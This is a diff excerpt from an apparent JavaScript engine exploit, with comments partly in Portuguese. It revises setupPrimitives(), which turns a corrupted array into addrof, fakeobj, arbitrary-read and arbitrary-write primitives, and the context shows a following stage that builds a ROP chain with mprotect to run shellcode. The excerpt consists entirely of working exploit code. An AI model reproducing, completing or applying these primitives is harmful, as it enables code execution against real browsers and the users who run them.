@@ -37,38 +37,35 @@
     //–– 2) build addrof/fakeobj/arb_read/arb_write
     let addrof, fakeobj, arb_read, arb_write;
     function setupPrimitives() {
-      log("[+] setupPrimitives()");
-      const corrupt = makeCorruptArray();
-      log("    corrupt[1] (leak) = "+ corrupt[1]);
-      let leak = f2i(corrupt[1]);
-      log("    backing ptr leak = 0x"+leak.toString(16));
-      // victim buffer whose backing ptr we control via corrupt[1]
-      let victim_buf = new ArrayBuffer(0x2000);
-      let victim_f64 = new Float64Array(victim_buf);
+  log("[+] setupPrimitives()");
+  corrupt = makeCorruptArray(); // <-- sem const aqui!!
+  log("    corrupt[1] (leak) = "+ corrupt[1]);
+  let leak = f2i(corrupt[1]);
+  log("    backing ptr leak = 0x"+leak.toString(16));
+  let victim_buf = new ArrayBuffer(0x2000);
+  let victim_f64 = new Float64Array(victim_buf);
 
-      // redireciona corrupt[1] para apontar ao backing-ptr de victim_buf
-      corrupt[1] = i2f(leak);
+  corrupt[1] = i2f(leak);
 
-      addrof = obj => {
-        victim_f64[0] = obj;               // write obj ref into backing
-        return f2i(corrupt[1]);            // leak its “address”
-      };
-      fakeobj = addr => {
-        corrupt[1] = i2f(addr);            // apontar backing ptr para addr
-        return new Float64Array(victim_buf)[0]; 
-      };
-      arb_read = addr => {
-        corrupt[1] = i2f(addr);
-        return f2i(victim_f64[1]);
-      };
-      arb_write = (addr,val) => {
-        corrupt[1] = i2f(addr);
-        victim_f64[1] = i2f(val);
-      };
+  addrof = obj => {
+    victim_f64[0] = obj;
+    return f2i(corrupt[1]);
+  };
+  fakeobj = addr => {
+    corrupt[1] = i2f(addr);
+    return new Float64Array(victim_buf)[0];
+  };
+  arb_read = addr => {
+    corrupt[1] = i2f(addr);
+    return f2i(victim_f64[1]);
+  };
+  arb_write = (addr,val) => {
+    corrupt[1] = i2f(addr);
+    victim_f64[1] = i2f(val);
+  };
 
-      log("    primitivas configuradas");  
-    }
-
+  log("    primitivas configuradas");  
+}
     //–– 3) ROPChain com mprotect
     let shellcodeAddr;
     function buildROP() {
